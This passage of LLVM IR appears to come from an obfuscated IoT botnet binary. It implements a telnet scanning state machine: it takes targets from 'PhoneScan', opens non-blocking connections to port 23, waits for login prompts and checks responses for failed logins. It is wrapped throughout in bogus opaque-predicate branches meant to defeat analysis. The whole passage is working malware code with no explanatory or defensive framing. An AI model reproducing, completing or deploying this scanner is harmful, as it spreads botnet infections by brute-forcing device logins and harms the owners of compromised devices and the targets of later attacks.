  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 3
  %35 = getelementptr inbounds [8 x i8], [8 x i8]* %34, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %35, i8 0, i64 8, i32 4, i1 false)
  %36 = call noalias i8* @malloc(i64 513) #5
  store i8* %36, i8** %21, align 8
  %37 = load i8*, i8** %21, align 8
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 513, i32 1, i1 false)
  %38 = load i32, i32* %14, align 4
  %39 = zext i32 %38 to i64
  %40 = call i8* @llvm.stacksave()
  store i8* %40, i8** %23, align 8
  %41 = alloca %struct.telstate_t, i64 %39, align 16
  %42 = bitcast %struct.telstate_t* %41 to i8*
  %43 = load i32, i32* %14, align 4
  %44 = sext i32 %43 to i64
  %45 = mul i64 %44, 5
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 %45, i32 16, i1 false)
  store i32 0, i32* %10, align 4
  %46 = load i32, i32* @x.89
  %47 = load i32, i32* @y.90
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %54

; <label>:54:                                     ; preds = %originalBBpart220, %originalBBpart2
  %55 = load i32, i32* %10, align 4
  %56 = load i32, i32* %14, align 4
  %57 = icmp slt i32 %55, %56
  br i1 %57, label %58, label %91

; <label>:58:                                     ; preds = %54
  %59 = load i32, i32* %10, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %60
  %62 = bitcast %struct.telstate_t* %61 to i8*
  call void @llvm.memset.p0i8.i64(i8* %62, i8 0, i64 32, i32 16, i1 false)
  %63 = load i32, i32* %10, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %65, i32 0, i32 3
  store i8 1, i8* %66, align 1
  %67 = load i8*, i8** %21, align 8
  %68 = load i32, i32* %10, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %69
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %70, i32 0, i32 9
  store i8* %67, i8** %71, align 8
  br label %72

; <label>:72:                                     ; preds = %58
  %73 = load i32, i32* @x.89
  %74 = load i32, i32* @y.90
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %72
  %81 = load i32, i32* %10, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %10, align 4
  %83 = load i32, i32* @x.89
  %84 = load i32, i32* @y.90
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart220, label %originalBB16alteredBB

originalBBpart220:                                ; preds = %originalBB16
  br label %54

; <label>:91:                                     ; preds = %54
  br label %92

; <label>:92:                                     ; preds = %originalBBpart2142, %91
  br label %93

; <label>:93:                                     ; preds = %92
  %94 = load i32, i32* @x.89
  %95 = load i32, i32* @y.90
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %93
  store i32 0, i32* %10, align 4
  %102 = load i32, i32* @x.89
  %103 = load i32, i32* @y.90
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %110

; <label>:110:                                    ; preds = %1128, %originalBBpart224
  %111 = load i32, i32* %10, align 4
  %112 = load i32, i32* %14, align 4
  %113 = icmp slt i32 %111, %112
  br i1 %113, label %114, label %1131

; <label>:114:                                    ; preds = %110
  %115 = load i32, i32* @x.89
  %116 = load i32, i32* @y.90
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %114
  %123 = load i32, i32* %10, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %124
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %125, i32 0, i32 7
  %127 = load i32, i32* %126, align 16
  %128 = icmp eq i32 %127, 0
  %129 = load i32, i32* @x.89
  %130 = load i32, i32* @y.90
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %128, label %137, label %159

; <label>:137:                                    ; preds = %originalBBpart228
  %138 = load i32, i32* @x.89
  %139 = load i32, i32* @y.90
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %137
  %146 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %147 = load i32, i32* %10, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %148
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %149, i32 0, i32 7
  store i32 %146, i32* %150, align 16
  %151 = load i32, i32* @x.89
  %152 = load i32, i32* @y.90
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %159

; <label>:159:                                    ; preds = %originalBBpart232, %originalBBpart228
  %160 = load i32, i32* %10, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %161
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %162, i32 0, i32 2
  %164 = load i8, i8* %163, align 8
  %165 = zext i8 %164 to i32
  switch i32 %165, label %1111 [
    i32 0, label %166
    i32 1, label %298
    i32 2, label %489
    i32 3, label %572
    i32 4, label %594
    i32 5, label %693
    i32 6, label %731
    i32 7, label %825
    i32 8, label %863
    i32 9, label %962
    i32 10, label %1016
  ]

; <label>:166:                                    ; preds = %159
  %167 = load i32, i32* %10, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %168
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %169, i32 0, i32 3
  %171 = load i8, i8* %170, align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 1
  br i1 %173, label %174, label %194

; <label>:174:                                    ; preds = %166
  %175 = load i32, i32* %10, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 9
  %179 = load i8*, i8** %178, align 8
  store i8* %179, i8** %24, align 8
  %180 = load i32, i32* %10, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %181
  %183 = bitcast %struct.telstate_t* %182 to i8*
  call void @llvm.memset.p0i8.i64(i8* %183, i8 0, i64 32, i32 16, i1 false)
  %184 = load i8*, i8** %24, align 8
  %185 = load i32, i32* %10, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 9
  store i8* %184, i8** %188, align 8
  %189 = call i32 @PhoneScan()
  %190 = load i32, i32* %10, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %191
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %192, i32 0, i32 1
  store i32 %189, i32* %193, align 4
  br label %194

; <label>:194:                                    ; preds = %174, %166
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 0
  store i16 2, i16* %195, align 4
  %196 = call zeroext i16 @htons(i16 zeroext 23) #13
  %197 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 1
  store i16 %196, i16* %197, align 2
  %198 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 3
  %199 = getelementptr inbounds [8 x i8], [8 x i8]* %198, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %199, i8 0, i64 8, i32 4, i1 false)
  %200 = load i32, i32* %10, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 1
  %204 = load i32, i32* %203, align 4
  %205 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 2
  %206 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %205, i32 0, i32 0
  store i32 %204, i32* %206, align 4
  %207 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %208 = load i32, i32* %10, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %209
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %210, i32 0, i32 0
  store i32 %207, i32* %211, align 16
  %212 = load i32, i32* %10, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %213
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 16
  %217 = icmp eq i32 %216, -1
  br i1 %217, label %218, label %235

; <label>:218:                                    ; preds = %194
  %219 = load i32, i32* @x.89
  %220 = load i32, i32* @y.90
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %218
  %227 = load i32, i32* @x.89
  %228 = load i32, i32* @y.90
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %1128

; <label>:235:                                    ; preds = %194
  %236 = load i32, i32* %10, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %237
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %238, i32 0, i32 0
  %240 = load i32, i32* %239, align 16
  %241 = load i32, i32* %10, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %242
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %243, i32 0, i32 0
  %245 = load i32, i32* %244, align 16
  %246 = call i32 (i32, i32, ...) @fcntl(i32 %245, i32 3, i8* null)
  %247 = or i32 %246, 2048
  %248 = call i32 (i32, i32, ...) @fcntl(i32 %240, i32 4, i32 %247)
  %249 = load i32, i32* %10, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %250
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %251, i32 0, i32 0
  %253 = load i32, i32* %252, align 16
  %254 = bitcast %struct.sockaddr_in* %22 to %struct.sockaddr*
  %255 = call i32 @connect(i32 %253, %struct.sockaddr* %254, i32 16)
  %256 = icmp eq i32 %255, -1
  br i1 %256, label %257, label %272

; <label>:257:                                    ; preds = %235
  %258 = call i32* @__errno_location() #13
  %259 = load i32, i32* %258, align 4
  %260 = icmp ne i32 %259, 115
  br i1 %260, label %261, label %272

; <label>:261:                                    ; preds = %257
  %262 = load i32, i32* %10, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %263
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %264, i32 0, i32 0
  %266 = load i32, i32* %265, align 16
  %267 = call i32 @sclose(i32 %266)
  %268 = load i32, i32* %10, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %269
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %270, i32 0, i32 3
  store i8 1, i8* %271, align 1
  br label %281

; <label>:272:                                    ; preds = %257, %235
  %273 = load i32, i32* %10, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %274
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %275, i32 0, i32 2
  store i8 1, i8* %276, align 8
  %277 = load i32, i32* %10, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %278
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %279, i32 0, i32 7
  store i32 0, i32* %280, align 16
  br label %281

; <label>:281:                                    ; preds = %272, %261
  %282 = load i32, i32* @x.89
  %283 = load i32, i32* @y.90
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %281
  %290 = load i32, i32* @x.89
  %291 = load i32, i32* @y.90
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %1111

; <label>:298:                                    ; preds = %159
  br label %299

; <label>:299:                                    ; preds = %298
  %300 = load i32, i32* @x.89
  %301 = load i32, i32* @y.90
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %299
  %308 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %17, i32 0, i32 0
  %309 = getelementptr inbounds [16 x i64], [16 x i64]* %308, i64 0, i64 0
  %310 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %309) #5, !srcloc !6
  %311 = extractvalue { i64, i64* } %310, 0
  %312 = extractvalue { i64, i64* } %310, 1
  %313 = trunc i64 %311 to i32
  store i32 %313, i32* %25, align 4
  %314 = ptrtoint i64* %312 to i64
  %315 = trunc i64 %314 to i32
  store i32 %315, i32* %26, align 4
  %316 = load i32, i32* @x.89
  %317 = load i32, i32* @y.90
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %324

; <label>:324:                                    ; preds = %originalBBpart244
  br label %325

; <label>:325:                                    ; preds = %324
  %326 = load i32, i32* %10, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %327
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %328, i32 0, i32 0
  %330 = load i32, i32* %329, align 16
  %331 = srem i32 %330, 64
  %332 = zext i32 %331 to i64
  %333 = shl i64 1, %332
  %334 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %17, i32 0, i32 0
  %335 = load i32, i32* %10, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %336
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %337, i32 0, i32 0
  %339 = load i32, i32* %338, align 16
  %340 = sdiv i32 %339, 64
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds [16 x i64], [16 x i64]* %334, i64 0, i64 %341
  %343 = load i64, i64* %342, align 8
  %344 = or i64 %343, %333
  store i64 %344, i64* %342, align 8
  %345 = getelementptr inbounds %struct.timeval, %struct.timeval* %18, i32 0, i32 0
  store i64 0, i64* %345, align 8
  %346 = getelementptr inbounds %struct.timeval, %struct.timeval* %18, i32 0, i32 1
  store i64 10000, i64* %346, align 8
  %347 = load i32, i32* %10, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %349, i32 0, i32 0
  %351 = load i32, i32* %350, align 16
  %352 = add nsw i32 %351, 1
  %353 = call i32 @select(i32 %352, %struct.__sigset_t* null, %struct.__sigset_t* %17, %struct.__sigset_t* null, %struct.timeval* %18)
  store i32 %353, i32* %11, align 4
  %354 = load i32, i32* %11, align 4
  %355 = icmp eq i32 %354, 1
  br i1 %355, label %356, label %413

; <label>:356:                                    ; preds = %325
  store i32 4, i32* %19, align 4
  store i32 0, i32* %13, align 4
  %357 = load i32, i32* %10, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %358
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %359, i32 0, i32 0
  %361 = load i32, i32* %360, align 16
  %362 = bitcast i32* %13 to i8*
  %363 = call i32 @getsockopt(i32 %361, i32 1, i32 4, i8* %362, i32* %19) #5
  %364 = load i32, i32* %13, align 4
  %365 = icmp ne i32 %364, 0
  br i1 %365, label %366, label %381

; <label>:366:                                    ; preds = %356
  %367 = load i32, i32* %10, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %368
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %369, i32 0, i32 0
  %371 = load i32, i32* %370, align 16
  %372 = call i32 @sclose(i32 %371)
  %373 = load i32, i32* %10, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %374
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %375, i32 0, i32 2
  store i8 0, i8* %376, align 8
  %377 = load i32, i32* %10, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %378
  %380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %379, i32 0, i32 3
  store i8 1, i8* %380, align 1
  br label %412

; <label>:381:                                    ; preds = %356
  %382 = load i32, i32* %10, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %383
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %384, i32 0, i32 0
  %386 = load i32, i32* %385, align 16
  %387 = load i32, i32* %10, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %388
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %389, i32 0, i32 0
  %391 = load i32, i32* %390, align 16
  %392 = call i32 (i32, i32, ...) @fcntl(i32 %391, i32 3, i8* null)
  %393 = and i32 %392, -2049
  %394 = call i32 (i32, i32, ...) @fcntl(i32 %386, i32 4, i32 %393)
  %395 = load i32, i32* %10, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %396
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %397, i32 0, i32 7
  store i32 0, i32* %398, align 16
  %399 = load i32, i32* %10, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %400
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %401, i32 0, i32 8
  store i16 0, i16* %402, align 4
  %403 = load i32, i32* %10, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %404
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %405, i32 0, i32 9
  %407 = load i8*, i8** %406, align 8
  call void @llvm.memset.p0i8.i64(i8* %407, i8 0, i64 512, i32 1, i1 false)
  %408 = load i32, i32* %10, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %409
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %410, i32 0, i32 2
  store i8 2, i8* %411, align 8
  br label %412

; <label>:412:                                    ; preds = %381, %366
  br label %1128

; <label>:413:                                    ; preds = %325
  %414 = load i32, i32* @x.89
  %415 = load i32, i32* @y.90
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %413
  %422 = load i32, i32* %11, align 4
  %423 = icmp eq i32 %422, -1
  %424 = load i32, i32* @x.89
  %425 = load i32, i32* @y.90
  %426 = sub i32 %424, 1
  %427 = mul i32 %424, %426
  %428 = urem i32 %427, 2
  %429 = icmp eq i32 %428, 0
  %430 = icmp slt i32 %425, 10
  %431 = or i1 %429, %430
  br i1 %431, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %423, label %432, label %447

; <label>:432:                                    ; preds = %originalBBpart248
  %433 = load i32, i32* %10, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %434
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %435, i32 0, i32 0
  %437 = load i32, i32* %436, align 16
  %438 = call i32 @sclose(i32 %437)
  %439 = load i32, i32* %10, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %440
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %441, i32 0, i32 2
  store i8 0, i8* %442, align 8
  %443 = load i32, i32* %10, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %444
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %445, i32 0, i32 3
  store i8 1, i8* %446, align 1
  br label %1128

; <label>:447:                                    ; preds = %originalBBpart248
  br label %448

; <label>:448:                                    ; preds = %447
  %449 = load i32, i32* %10, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 7
  %453 = load i32, i32* %452, align 16
  %454 = add i32 %453, 6
  %455 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %456 = icmp ult i32 %454, %455
  br i1 %456, label %457, label %488

; <label>:457:                                    ; preds = %448
  %458 = load i32, i32* @x.89
  %459 = load i32, i32* @y.90
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %457
  %466 = load i32, i32* %10, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 0
  %470 = load i32, i32* %469, align 16
  %471 = call i32 @sclose(i32 %470)
  %472 = load i32, i32* %10, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %473
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %474, i32 0, i32 2
  store i8 0, i8* %475, align 8
  %476 = load i32, i32* %10, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %477
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %478, i32 0, i32 3
  store i8 1, i8* %479, align 1
  %480 = load i32, i32* @x.89
  %481 = load i32, i32* @y.90
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %488

; <label>:488:                                    ; preds = %originalBBpart252, %448
  br label %1111

; <label>:489:                                    ; preds = %159
  %490 = load i32, i32* @x.89
  %491 = load i32, i32* @y.90
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %489
  %498 = load i32, i32* %10, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %499
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %500, i32 0, i32 0
  %502 = load i32, i32* %501, align 16
  %503 = load i32, i32* %10, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %504
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %505, i32 0, i32 9
  %507 = load i8*, i8** %506, align 8
  %508 = call i32 @read_until_response(i32 %502, i32 10000, i8* %507, i32 512, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %509 = icmp ne i32 %508, 0
  %510 = load i32, i32* @x.89
  %511 = load i32, i32* @y.90
  %512 = sub i32 %510, 1
  %513 = mul i32 %510, %512
  %514 = urem i32 %513, 2
  %515 = icmp eq i32 %514, 0
  %516 = icmp slt i32 %511, 10
  %517 = or i1 %515, %516
  br i1 %517, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %509, label %518, label %537

; <label>:518:                                    ; preds = %originalBBpart256
  %519 = load i32, i32* %10, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %520
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %521, i32 0, i32 9
  %523 = load i8*, i8** %522, align 8
  %524 = call i32 @contains_fail(i8* %523)
  %525 = icmp ne i32 %524, 0
  br i1 %525, label %526, label %531

; <label>:526:                                    ; preds = %518
  %527 = load i32, i32* %10, align 4
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %528
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %529, i32 0, i32 2
  store i8 0, i8* %530, align 8
  br label %536

; <label>:531:                                    ; preds = %518
  %532 = load i32, i32* %10, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %533
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %534, i32 0, i32 2
  store i8 3, i8* %535, align 8
  br label %536

; <label>:536:                                    ; preds = %531, %526
  br label %1128

